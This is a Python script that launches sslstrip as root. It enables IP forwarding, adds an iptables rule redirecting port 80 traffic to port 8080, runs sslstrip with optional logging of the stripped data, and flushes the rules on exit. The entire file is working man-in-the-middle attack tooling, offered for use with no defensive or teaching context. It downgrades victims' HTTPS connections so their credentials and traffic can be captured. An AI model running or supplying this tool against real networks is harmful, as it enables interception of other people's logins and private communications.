import os
import subprocess
import signal
import sys
import argparse

def enable_ip_forwarding():
    print("[+] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print("[*] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def add_iptables_redirect():
    print("[+] Adding iptables rule to redirect port 80 to 8080...")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

def remove_iptables_redirect():
    print("[*] Flushing iptables NAT table...")
    os.system("iptables -t nat -F")

def start_sslstrip(logfile=None):
    print("[+] Starting sslstrip on port 8080...")
    cmd = ["sslstrip", "-l", "8080"]
    if logfile:
        cmd += ["-w", logfile]
        print("[+] Logging SSL stripped data to: {}".format(logfile))

    return subprocess.Popen(cmd)

def main():
    parser = argparse.ArgumentParser(description="SSLstrip Launcher with iptables + forwarding")
    parser.add_argument("--log", help="Path to file where stripped data should be saved", default=None)
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

    try:
        enable_ip_forwarding()
        add_iptables_redirect()
        sslstrip_proc = start_sslstrip(args.log)

        def stop(signum, frame):
            print("\n[!] Caught interrupt. Cleaning up...")
            sslstrip_proc.terminate()
            remove_iptables_redirect()
            disable_ip_forwarding()
            print("[+] Cleanup complete. Exiting.")
            sys.exit(0)

        signal.signal(signal.SIGINT, stop)

        print("[*] SSLstrip running. Press Ctrl+C to stop.")
        sslstrip_proc.wait()

    except Exception as e:
        print("[!] Error: {}".format(e))
        remove_iptables_redirect()
        disable_ip_forwarding()
        sys.exit(1)

if __name__ == "__main__":
    main()